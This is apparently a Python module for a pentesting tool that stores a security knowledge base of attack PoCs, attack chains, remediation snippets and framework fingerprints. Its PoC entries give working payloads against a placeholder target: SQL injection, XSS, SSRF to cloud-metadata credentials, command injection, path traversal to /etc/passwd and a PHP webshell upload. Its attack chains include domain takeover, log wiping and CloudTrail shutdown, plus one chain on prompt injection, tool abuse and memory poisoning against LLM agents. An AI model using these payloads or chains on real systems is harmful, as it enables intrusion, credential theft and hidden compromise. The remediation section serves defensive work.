#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
安全知识库体系（Security Knowledge Base）

包含：
- PoC库：各类漏洞的验证代码模板
- 攻击链库：完整攻击路径模板
- 修复方案库：代码级修复方案
- 指纹库：服务/框架/CMS/设备指纹识别
- Payload库：常见攻击Payload
"""

import json
import re
import time
import hashlib
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from enum import Enum


class VulnCategory(Enum):
    """漏洞分类"""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    SSRF = "ssrf"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    IDOR = "idor"
    AUTH_BYPASS = "auth_bypass"
    HARDCODED_CREDENTIALS = "hardcoded_credentials"
    CORS_MISCONFIG = "cors_misconfig"
    INSECURE_DESERIALIZATION = "insecure_deserialization"
    XXE = "xxe"
    OPEN_REDIRECT = "open_redirect"
    CSRF = "csrf"
    INFO_DISCLOSURE = "info_disclosure"
    RCE = "rce"
    FILE_UPLOAD = "file_upload"


@dataclass
class PoCEntry:
    """PoC条目"""
    poc_id: str
    name: str
    category: str
    severity: str
    description: str
    code: str  # PoC代码模板
    language: str = "python"
    cwe: str = ""
    cvss: float = 0.0
    references: List[str] = field(default_factory=list)
    verified: bool = False


@dataclass
class AttackChain:
    """攻击链模板"""
    chain_id: str
    name: str
    description: str
    stages: List[Dict]  # [{stage, action, tool, expected_result}]
    target_type: str = "web"
    difficulty: str = "medium"
    mitre_techniques: List[str] = field(default_factory=list)


@dataclass
class Remediation:
    """修复方案"""
    rem_id: str
    vuln_type: str
    title: str
    description: str
    before_code: str
    after_code: str
    language: str = "python"
    references: List[str] = field(default_factory=list)


@dataclass
class Fingerprint:
    """指纹条目"""
    fp_id: str
    name: str
    category: str  # cms/framework/server/device/language
    indicators: List[str]  # 匹配规则（header/path/favicon hash等）
    version_patterns: List[str] = field(default_factory=list)
    related_vulns: List[str] = field(default_factory=list)


class PoCLibrary:
    """PoC库"""

    def __init__(self):
        self.pocs: Dict[str, PoCEntry] = self._load_builtin_pocs()

    def _load_builtin_pocs(self) -> Dict[str, PoCEntry]:
        """加载内置PoC"""
        pocs = {}

        poc_list = [
            PoCEntry(
                poc_id="POC-001",
                name="SQL注入 - UNION查询",
                category="sql_injection",
                severity="high",
                description="通过UNION SELECT提取数据库数据",
                code="""import requests
# SQL注入 UNION 查询 PoC
url = "http://target.com/page?id="
payload = "1 UNION SELECT null,username,password FROM users--"
resp = requests.get(url + payload)
if "admin" in resp.text:
    print("[+] SQL注入成功，提取到管理员凭证")
else:
    print("[-] 未检测到SQL注入")
""",
                cwe="CWE-89",
                cvss=8.5,
            ),
            PoCEntry(
                poc_id="POC-002",
                name="SQL注入 - 时间盲注",
                category="sql_injection",
                severity="high",
                description="通过SLEEP/BENCHMARK进行时间盲注",
                code="""import requests, time
url = "http://target.com/page?id="
# 时间盲注 PoC
start = time.time()
resp = requests.get(url + "1 AND SLEEP(5)--")
elapsed = time.time() - start
if elapsed >= 5:
    print("[+] 时间盲注成功，延迟%.1f秒" % elapsed)
""",
                cwe="CWE-89",
                cvss=8.0,
            ),
            PoCEntry(
                poc_id="POC-003",
                name="XSS - 反射型",
                category="xss",
                severity="medium",
                description="反射型XSS，在响应中执行JavaScript",
                code="""import requests
url = "http://target.com/search?q="
payload = "<script>alert('XSS')</script>"
resp = requests.get(url + payload)
if payload in resp.text:
    print("[+] 反射型XSS成功")
""",
                cwe="CWE-79",
                cvss=6.1,
            ),
            PoCEntry(
                poc_id="POC-004",
                name="SSRF - 云元数据",
                category="ssrf",
                severity="high",
                description="通过SSRF访问云服务元数据接口",
                code="""import requests
url = "http://target.com/fetch?url="
# AWS元数据
payload = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
resp = requests.get(url + payload)
if "AccessKeyId" in resp.text or "role" in resp.text:
    print("[+] SSRF成功，可访问云元数据")
# GCP元数据
payload2 = "http://metadata.google.internal/computeMetadata/v1/"
resp2 = requests.get(url + payload2, headers={"Metadata-Flavor": "Google"})
""",
                cwe="CWE-918",
                cvss=8.6,
            ),
            PoCEntry(
                poc_id="POC-005",
                name="命令注入 - 基础",
                category="command_injection",
                severity="critical",
                description="通过分号/管道符注入系统命令",
                code="""import requests
url = "http://target.com/ping?host="
payload = "127.0.0.1; id; whoami"
resp = requests.get(url + payload)
if "uid=" in resp.text or "root" in resp.text:
    print("[+] 命令注入成功")
    print(resp.text[:200])
""",
                cwe="CWE-78",
                cvss=9.8,
            ),
            PoCEntry(
                poc_id="POC-006",
                name="路径遍历 - /etc/passwd",
                category="path_traversal",
                severity="high",
                description="通过../读取敏感文件",
                code="""import requests
url = "http://target.com/download?file="
payloads = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//etc/passwd",
]
for p in payloads:
    resp = requests.get(url + p)
    if "root:x:" in resp.text:
        print("[+] 路径遍历成功: " + p)
        break
""",
                cwe="CWE-22",
                cvss=7.5,
            ),
            PoCEntry(
                poc_id="POC-007",
                name="IDOR - 越权访问",
                category="idor",
                severity="high",
                description="通过修改ID访问其他用户数据",
                code="""import requests
base = "http://target.com/api/users/"
# 遍历用户ID
for uid in range(1, 100):
    resp = requests.get(base + str(uid), headers={"Authorization": "Bearer YOUR_TOKEN"})
    if resp.status_code == 200 and uid != YOUR_UID:
        data = resp.json()
        if "email" in data or "password" in data:
            print(f"[+] IDOR成功，访问用户{uid}数据: {data}")
            break
""",
                cwe="CWE-639",
                cvss=8.1,
            ),
            PoCEntry(
                poc_id="POC-008",
                name="硬编码凭证检测",
                category="hardcoded_credentials",
                severity="high",
                description="检测代码/配置中的硬编码API Key和密码",
                code="""import re
# 硬编码凭证检测正则
patterns = {
    'AWS Key': r'AKIA[0-9A-Z]{16}',
    'GitHub Token': r'gh[pousr]_[A-Za-z0-9]{36}',
    'Slack Token': r'xox[baprs]-[A-Za-z0-9-]+',
    'Private Key': r'-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----',
    'API Key': r'(?i)(api[_-]?key|secret|password)\\s*[=:]\\s*[\"\\'][A-Za-z0-9]{16,}[\"\\']',
}
with open('source_code.js', 'r') as f:
    content = f.read()
for name, pattern in patterns.items():
    matches = re.findall(pattern, content)
    if matches:
        print(f"[+] 发现{name}: {len(matches)}处")
""",
                cwe="CWE-798",
                cvss=9.8,
            ),
            PoCEntry(
                poc_id="POC-009",
                name="CORS配置错误",
                category="cors_misconfig",
                severity="medium",
                description="检测CORS配置是否允许任意源",
                code="""import requests
url = "http://target.com/api/data"
# 测试任意Origin
resp = requests.get(url, headers={"Origin": "https://evil.com"})
acao = resp.headers.get("Access-Control-Allow-Origin", "")
acac = resp.headers.get("Access-Control-Allow-Credentials", "")
if acao == "https://evil.com" and acac == "true":
    print("[+] CORS配置错误：允许任意源+凭证")
elif acao == "*":
    print("[!] CORS允许所有源（无凭证时风险较低）")
""",
                cwe="CWE-942",
                cvss=5.4,
            ),
            PoCEntry(
                poc_id="POC-010",
                name="文件上传 - WebShell",
                category="file_upload",
                severity="critical",
                description="上传恶意文件获取WebShell",
                code="""import requests
url = "http://target.com/upload"
# PHP WebShell
webshell = '<?php system($_GET["cmd"]); ?>'
files = {"file": ("shell.php", webshell, "image/png")}
resp = requests.post(url, files=files)
if resp.status_code == 200:
    shell_url = "http://target.com/uploads/shell.php?cmd=id"
    result = requests.get(shell_url)
    if "uid=" in result.text:
        print("[+] WebShell上传成功: " + shell_url)
""",
                cwe="CWE-434",
                cvss=9.8,
            ),
        ]

        for poc in poc_list:
            pocs[poc.poc_id] = poc
        return pocs

    def get_by_category(self, category: str) -> List[PoCEntry]:
        return [p for p in self.pocs.values() if p.category == category]

    def get_by_severity(self, severity: str) -> List[PoCEntry]:
        return [p for p in self.pocs.values() if p.severity == severity]

    def search(self, keyword: str) -> List[PoCEntry]:
        kw = keyword.lower()
        return [p for p in self.pocs.values()
                if kw in p.name.lower() or kw in p.description.lower() or kw in p.category]

    def get_stats(self) -> Dict:
        return {
            "total": len(self.pocs),
            "by_category": dict(Counter(p.category for p in self.pocs.values())),
            "by_severity": dict(Counter(p.severity for p in self.pocs.values())),
        }


class AttackChainLibrary:
    """攻击链库"""

    def __init__(self):
        self.chains: Dict[str, AttackChain] = self._load_builtin_chains()

    def _load_builtin_chains(self) -> Dict[str, AttackChain]:
        chains = {}

        chain_list = [
            AttackChain(
                chain_id="CHAIN-001",
                name="Web应用标准渗透链",
                description="从信息收集到获取服务器权限的完整Web渗透路径",
                target_type="web",
                difficulty="medium",
                stages=[
                    {"stage": "侦察", "action": "子域名枚举+端口扫描", "tool": "subfinder+nmap", "expected": "发现所有子域名和开放端口"},
                    {"stage": "指纹识别", "action": "CMS/框架/服务器版本识别", "tool": "httpx+whatweb", "expected": "确定技术栈和已知漏洞"},
                    {"stage": "漏洞扫描", "action": "Web漏洞扫描+目录爆破", "tool": "nuclei+dirsearch", "expected": "发现可利用漏洞"},
                    {"stage": "漏洞验证", "action": "SQL注入/XSS/SSRF验证", "tool": "sqlmap+手工", "expected": "确认漏洞可利用"},
                    {"stage": "获取权限", "action": "WebShell上传或命令执行", "tool": "自定义PoC", "expected": "获取服务器访问权限"},
                    {"stage": "后渗透", "action": "提权+横向移动+数据收集", "tool": "LinPEAS+impacket", "expected": "扩大控制范围"},
                    {"stage": "清理", "action": "日志清理+痕迹消除", "tool": "自定义脚本", "expected": "消除入侵痕迹"},
                ],
                mitre_techniques=["T1595", "T1190", "T1059", "T1068", "T1070"],
            ),
            AttackChain(
                chain_id="CHAIN-002",
                name="API攻击链",
                description="针对REST/GraphQL API的完整攻击路径",
                target_type="api",
                difficulty="hard",
                stages=[
                    {"stage": "API发现", "action": "JS分析+爬虫+Source Map解析", "tool": "Katana+自定义", "expected": "发现所有API端点"},
                    {"stage": "参数补全", "action": "路径推断+AI语义补全", "tool": "AI引擎", "expected": "补全缺失参数"},
                    {"stage": "认证测试", "action": "未授权访问+JWT攻击", "tool": "自定义", "expected": "绕过认证"},
                    {"stage": "越权测试", "action": "IDOR+BOLA+批量枚举", "tool": "自定义", "expected": "访问他人数据"},
                    {"stage": "注入测试", "action": "SQL/NoSQL/命令注入", "tool": "sqlmap+自定义", "expected": "获取数据或执行命令"},
                    {"stage": "业务逻辑", "action": "竞态条件+流程绕过", "tool": "自定义", "expected": "获取业务利益"},
                ],
                mitre_techniques=["T1190", "T1078", "T1059"],
            ),
            AttackChain(
                chain_id="CHAIN-003",
                name="内网渗透链",
                description="从边界突破到域控的完整内网路径",
                target_type="internal",
                difficulty="hard",
                stages=[
                    {"stage": "初始访问", "action": "边界漏洞利用或钓鱼", "tool": "MSF+自定义", "expected": "获取内网立足点"},
                    {"stage": "信息收集", "action": "域信息+用户+共享枚举", "tool": "BloodHound+PowerView", "expected": "绘制域拓扑"},
                    {"stage": "凭证获取", "action": "哈希抓取+票据提取", "tool": "mimikatz+Rubeus", "expected": "获取用户凭证"},
                    {"stage": "横向移动", "action": "PTH+WinRM+WMI", "tool": "impacket+crackmapexec", "expected": "控制多台主机"},
                    {"stage": "权限提升", "action": "本地提权+域内提权", "tool": "JuicyPotato+PrintNightmare", "expected": "获取SYSTEM/域管"},
                    {"stage": "域控控制", "action": "DCSync+黄金票据", "tool": "mimikatz", "expected": "完全控制域"},
                ],
                mitre_techniques=["T1078", "T1003", "T1550", "T1021", "T1068"],
            ),
            AttackChain(
                chain_id="CHAIN-004",
                name="云环境攻击链",
                description="针对AWS/Azure/GCP的云原生攻击路径",
                target_type="cloud",
                difficulty="hard",
                stages=[
                    {"stage": "初始访问", "action": "凭证泄露+SSRF元数据", "tool": "自定义+SSRF PoC", "expected": "获取云凭证"},
                    {"stage": "权限枚举", "action": "IAM角色+策略枚举", "tool": "AWS CLI+Pacu", "expected": "确定权限范围"},
                    {"stage": "权限提升", "action": "角色冒充+策略修改", "tool": "Pacu+自定义", "expected": "提升权限"},
                    {"stage": "数据访问", "action": "S3/Blob存储枚举", "tool": "AWS CLI", "expected": "访问敏感数据"},
                    {"stage": "持久化", "action": "创建后门用户+Lambda", "tool": "自定义", "expected": "建立持久访问"},
                    {"stage": "防御绕过", "action": "CloudTrail关闭+日志删除", "tool": "AWS CLI", "expected": "消除痕迹"},
                ],
                mitre_techniques=["T1078", "T1552", "T1098", "T1562"],
            ),
            AttackChain(
                chain_id="CHAIN-005",
                name="AI智能体攻击链",
                description="针对LLM Agent/MCP服务器的攻击路径",
                target_type="ai",
                difficulty="expert",
                stages=[
                    {"stage": "侦察", "action": "Agent能力+工具枚举", "tool": "自定义", "expected": "了解Agent能力边界"},
                    {"stage": "提示注入", "action": "直接/间接提示注入", "tool": "自定义Payload", "expected": "控制Agent行为"},
                    {"stage": "工具滥用", "action": "诱导调用危险工具", "tool": "自定义", "expected": "执行未授权操作"},
                    {"stage": "数据渗出", "action": "通过工具调用渗出数据", "tool": "自定义", "expected": "窃取敏感信息"},
                    {"stage": "持久化", "action": "记忆投毒+木马MCP", "tool": "自定义", "expected": "建立持久控制"},
                    {"stage": "横向扩散", "action": "Agent间攻击+供应链", "tool": "自定义", "expected": "扩散到其他Agent"},
                ],
                mitre_techniques=["T1059", "T1562", "T1078", "T1195"],
            ),
        ]

        for chain in chain_list:
            chains[chain.chain_id] = chain
        return chains

    def get_by_target(self, target_type: str) -> List[AttackChain]:
        return [c for c in self.chains.values() if c.target_type == target_type]

    def get_stats(self) -> Dict:
        return {
            "total": len(self.chains),
            "by_target": dict(Counter(c.target_type for c in self.chains.values())),
            "by_difficulty": dict(Counter(c.difficulty for c in self.chains.values())),
        }


class RemediationLibrary:
    """修复方案库"""

    def __init__(self):
        self.remediations: Dict[str, Remediation] = self._load_builtin_remediations()

    def _load_builtin_remediations(self) -> Dict[str, Remediation]:
        rems = {}

        rem_list = [
            Remediation(
                rem_id="REM-001",
                vuln_type="sql_injection",
                title="SQL注入 - 参数化查询",
                description="使用参数化查询替代字符串拼接",
                before_code="""# 不安全：字符串拼接
query = "SELECT * FROM users WHERE id = " + user_input
cursor.execute(query)""",
                after_code="""# 安全：参数化查询
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_input,))""",
                language="python",
            ),
            Remediation(
                rem_id="REM-002",
                vuln_type="xss",
                title="XSS - 输出编码",
                description="对用户输入进行HTML实体编码",
                before_code="""# 不安全：直接输出
return "<div>" + user_input + "</div>\"""",
                after_code="""# 安全：HTML编码
import html
return "<div>" + html.escape(user_input) + "</div>\"""",
                language="python",
            ),
            Remediation(
                rem_id="REM-003",
                vuln_type="ssrf",
                title="SSRF - URL白名单",
                description="限制可请求的URL域名和IP范围",
                before_code="""# 不安全：任意URL请求
url = request.args.get('url')
resp = requests.get(url)""",
                after_code="""# 安全：白名单+内网IP过滤
ALLOWED_DOMAINS = {'api.example.com', 'cdn.example.com'}
from urllib.parse import urlparse
import ipaddress
parsed = urlparse(url)
if parsed.hostname not in ALLOWED_DOMAINS:
    return 'Forbidden', 403
# 解析IP并过滤内网
ip = socket.gethostbyname(parsed.hostname)
if ipaddress.ip_address(ip).is_private:
    return 'Forbidden', 403""",
                language="python",
            ),
            Remediation(
                rem_id="REM-004",
                vuln_type="command_injection",
                title="命令注入 - 参数列表",
                description="使用subprocess参数列表而非shell=True",
                before_code="""# 不安全：shell=True
import subprocess
subprocess.run("ping " + host, shell=True)""",
                after_code="""# 安全：参数列表
import subprocess
subprocess.run(['ping', '-c', '4', host], shell=False)""",
                language="python",
            ),
            Remediation(
                rem_id="REM-005",
                vuln_type="path_traversal",
                title="路径遍历 - 路径规范化",
                description="规范化路径并限制在允许目录内",
                before_code="""# 不安全：直接拼接路径
filepath = "/var/www/uploads/" + filename
with open(filepath) as f: ...""",
                after_code="""# 安全：规范化+目录限制
import os
BASE_DIR = os.path.realpath('/var/www/uploads/')
filepath = os.path.realpath(os.path.join(BASE_DIR, filename))
if not filepath.startswith(BASE_DIR + os.sep):
    return 'Forbidden', 403
with open(filepath) as f: ...""",
                language="python",
            ),
            Remediation(
                rem_id="REM-006",
                vuln_type="hardcoded_credentials",
                title="硬编码凭证 - 环境变量",
                description="使用环境变量或密钥管理服务",
                before_code="""# 不安全：硬编码
API_KEY = "sk-1234567890abcdef"
DB_PASSWORD = "admin123\"""",
                after_code="""# 安全：环境变量
import os
API_KEY = os.environ.get('API_KEY')
DB_PASSWORD = os.environ.get('DB_PASSWORD')
# 或使用AWS Secrets Manager / HashiCorp Vault""",
                language="python",
            ),
            Remediation(
                rem_id="REM-007",
                vuln_type="file_upload",
                title="文件上传 - 类型校验",
                description="校验文件类型+重命名+隔离存储",
                before_code="""# 不安全：直接保存
file = request.files['file']
file.save('uploads/' + file.filename)""",
                after_code="""# 安全：类型校验+随机命名
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
ALLOWED_MIME = {'image/png', 'image/jpeg', 'image/gif'}
if '.' not in file.filename: return 'Invalid', 400
ext = file.filename.rsplit('.', 1)[1].lower()
if ext not in ALLOWED_EXTENSIONS: return 'Invalid', 400
# 验证MIME类型和文件头
import uuid, mimetypes
safe_name = str(uuid.uuid4()) + '.' + ext
file.save(os.path.join('/var/uploads/', safe_name))""",
                language="python",
            ),
            Remediation(
                rem_id="REM-008",
                vuln_type="idor",
                title="IDOR - 服务端授权检查",
                description="在服务端验证用户对资源的所有权",
                before_code="""# 不安全：仅根据ID返回数据
@app.get('/api/users/{uid}')
def get_user(uid):
    return db.get_user(uid)""",
                after_code="""# 安全：服务端授权检查
@app.get('/api/users/{uid}')
def get_user(uid, current_user=Depends(get_current_user)):
    if uid != current_user.id and not current_user.is_admin:
        raise HTTPException(403, 'Forbidden')
    return db.get_user(uid)""",
                language="python",
            ),
        ]

        for rem in rem_list:
            rems[rem.rem_id] = rem
        return rems

    def get_by_vuln_type(self, vuln_type: str) -> List[Remediation]:
        return [r for r in self.remediations.values() if r.vuln_type == vuln_type]

    def get_stats(self) -> Dict:
        return {
            "total": len(self.remediations),
            "by_type": dict(Counter(r.vuln_type for r in self.remediations.values())),
        }


class FingerprintDB:
    """指纹库"""

    def __init__(self):
        self.fingerprints: Dict[str, Fingerprint] = self._load_builtin()

    def _load_builtin(self) -> Dict[str, Fingerprint]:
        fps = {}
        fp_list = [
            Fingerprint("FP-001", "WordPress", "cms",
                        ["wp-content", "wp-includes", "wp-login.php", "X-Pingback"],
                        [r'wp-(?:includes|content)/js/(?:jquery|wp-embed)\.min\.js\?ver=([\d.]+)'],
                        ["CVE-2022-21661", "CVE-2023-27452"]),
            Fingerprint("FP-002", "Drupal", "cms",
                        ["Drupal", "sites/default", "CHANGELOG.txt", "X-Generator: Drupal"],
                        [r'Drupal ([\d.]+)'],
                        ["CVE-2018-7600", "CVE-2019-6340"]),
            Fingerprint("FP-003", "Joomla", "cms",
                        ["joomla", "administrator/index.php", "media/system/js"],
                        [r'Joomla! ([\d.]+)'],
                        ["CVE-2023-23752"]),
            Fingerprint("FP-004", "Apache", "server",
                        ["Server: Apache", "Apache/"],
                        [r'Apache/([\d.]+)'],
                        ["CVE-2021-41773", "CVE-2021-42013"]),
            Fingerprint("FP-005", "Nginx", "server",
                        ["Server: nginx", "nginx/"],
                        [r'nginx/([\d.]+)'],
                        []),
            Fingerprint("FP-006", "Spring Boot", "framework",
                        ["spring-boot", "actuator", "Whitelabel Error Page", "/actuator/health"],
                        [],
                        ["CVE-2022-22965", "CVE-2022-22963"]),
            Fingerprint("FP-007", "Laravel", "framework",
                        ["laravel", "Laravel Telescope", "_debugbar", "ignition"],
                        [],
                        ["CVE-2021-3129"]),
            Fingerprint("FP-008", "Django", "framework",
                        ["csrftoken", "Django", "Admin: Django"],
                        [],
                        []),
            Fingerprint("FP-009", "PHP", "language",
                        ["X-Powered-By: PHP", "PHPSESSID", ".php"],
                        [r'PHP/([\d.]+)'],
                        []),
            Fingerprint("FP-010", "Node.js/Express", "language",
                        ["X-Powered-By: Express", "express", "connect.sid"],
                        [],
                        []),
            Fingerprint("FP-011", "Tomcat", "server",
                        ["Apache-Coyote", "Tomcat", "manager/html"],
                        [r'Apache Tomcat/([\d.]+)'],
                        ["CVE-2020-1938", "CVE-2017-12615"]),
            Fingerprint("FP-012", "Jenkins", "device",
                        ["Jenkins", "X-Jenkins", "/jenkins/login"],
                        [r'X-Jenkins: ([\d.]+)'],
                        ["CVE-2024-23897"]),
        ]
        for fp in fp_list:
            fps[fp.fp_id] = fp
        return fps

    def identify(self, headers: Dict, body: str = "", url: str = "") -> List[Fingerprint]:
        """识别指纹"""
        text = json.dumps(headers) + " " + body + " " + url
        matched = []
        for fp in self.fingerprints.values():
            if any(ind.lower() in text.lower() for ind in fp.indicators):
                matched.append(fp)
        return matched

    def get_stats(self) -> Dict:
        return {
            "total": len(self.fingerprints),
            "by_category": dict(Counter(f.category for f in self.fingerprints.values())),
        }


class SecurityKnowledgeBase:
    """
    安全知识库体系（主类）

    整合PoC库 + 攻击链库 + 修复方案库 + 指纹库。
    """

    def __init__(self):
        self.poc_lib = PoCLibrary()
        self.chain_lib = AttackChainLibrary()
        self.rem_lib = RemediationLibrary()
        self.fp_db = FingerprintDB()

    def get_full_stats(self) -> Dict:
        return {
            "poc_library": self.poc_lib.get_stats(),
            "attack_chains": self.chain_lib.get_stats(),
            "remediations": self.rem_lib.get_stats(),
            "fingerprints": self.fp_db.get_stats(),
            "total_entries": (
                len(self.poc_lib.pocs) + len(self.chain_lib.chains)
                + len(self.rem_lib.remediations) + len(self.fp_db.fingerprints)
            ),
        }

    def search_all(self, keyword: str) -> Dict:
        """全库搜索"""
        return {
            "pocs": [{"id": p.poc_id, "name": p.name, "severity": p.severity}
                     for p in self.poc_lib.search(keyword)],
            "chains": [{"id": c.chain_id, "name": c.name, "target": c.target_type}
                       for c in self.chain_lib.chains.values()
                       if keyword.lower() in c.name.lower() or keyword.lower() in c.description.lower()],
            "remediations": [{"id": r.rem_id, "title": r.title, "type": r.vuln_type}
                             for r in self.rem_lib.remediations.values()
                             if keyword.lower() in r.title.lower() or keyword.lower() in r.vuln_type],
            "fingerprints": [{"id": f.fp_id, "name": f.name, "category": f.category}
                             for f in self.fp_db.fingerprints.values()
                             if keyword.lower() in f.name.lower()],
        }


from collections import Counter

# 单例模式
_kb_instance: Optional[SecurityKnowledgeBase] = None

def get_knowledge_base() -> SecurityKnowledgeBase:
    global _kb_instance
    if _kb_instance is None:
        _kb_instance = SecurityKnowledgeBase()
    return _kb_instance
